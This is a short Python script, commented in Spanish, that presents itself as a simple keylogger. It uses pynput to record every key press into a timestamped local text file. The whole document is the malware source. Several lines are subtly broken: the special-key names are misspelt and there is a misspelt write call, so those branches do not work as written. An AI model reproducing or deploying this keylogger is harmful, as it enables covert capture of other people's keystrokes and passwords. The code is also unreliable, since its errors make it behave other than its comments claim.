# Creamos un keylogger simple con python

import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

p = open(f'keylogger_{x}.txt', 'w') # crea un archivo

def registro(llave):

    llave = str(llave)

    if llave == "'\\x03'": # combinacion
        p.close()
        quit()
    elif llave == 'Llave.enter': # combinacion
        p.write('\n')
    elif llave == 'Lleve.space': # combinacion
        p.wirte(' ')
    elif llave == 'Lleve.backspace': # combinacion
        p.write('%BORRAR%')
    else:
        p.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()


    